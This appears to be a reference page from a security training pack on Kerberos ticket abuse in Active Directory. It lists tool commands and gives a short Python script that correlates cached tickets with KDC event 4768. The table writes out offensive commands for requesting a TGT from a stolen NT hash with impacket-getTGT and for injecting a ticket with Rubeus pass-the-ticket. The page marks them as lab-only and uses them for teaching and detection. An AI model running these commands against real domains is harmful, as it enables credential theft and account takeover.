# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`active-directory-kerberos-attacks-ticket-abuse-and-forgery`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `klist` | `klist -e -f` | Ticket cache with encryption types and flags | Windows |
| `impacket-getTGT` | `impacket-getTGT corp.example/lowpriv -hashes :<nthash> -dc-ip 10.20.30.10` | TGT request from a hash, authorised lab only | Linux / Windows |
| `Rubeus` | `Rubeus.exe ptt /ticket:base64ticket` | Pass-the-ticket into a session | Windows |
| `impacket-ticketConverter` | `impacket-ticketConverter ticket.kirbi ticket.ccache` | Format conversion between cache types | Linux / Windows |
| `kinit` | `kinit -k -t keytab service@CORP.EXAMPLE` | Legitimate keytab-based TGT request, the baseline case | Linux |

## Minimal Lab Validation Script

Correlate ticket cache contents with KDC issuance events, so a replay claim always has both halves.

```python
import re, subprocess

def cache():
    out = subprocess.run(["klist", "-e", "-f"], capture_output=True, text=True).stdout
    return [ln for ln in out.splitlines() if "krbtgt" in ln.lower()]

def issued(minutes=60):
    ps = (f"Get-WinEvent -FilterHashtable @{{LogName='Security';Id=4768;"
          f"StartTime=(Get-Date).AddMinutes(-{minutes})}} | "
          f"Select-Object -ExpandProperty Message")
    out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                         capture_output=True, text=True).stdout
    return len(re.findall(r"Target User Name", out))

print("cached_tgts", cache())
print("recent_4768", issued())
```

## Flag Notes

- `-e` shows encryption types so an anomalous ticket is visible without decoding it.
- `-f` shows ticket flags; `forwardable` is what makes delegation possible from a stolen ticket.
- `--logon-type 9` reproduces the `NewCredentials` shape for a controlled comparison.
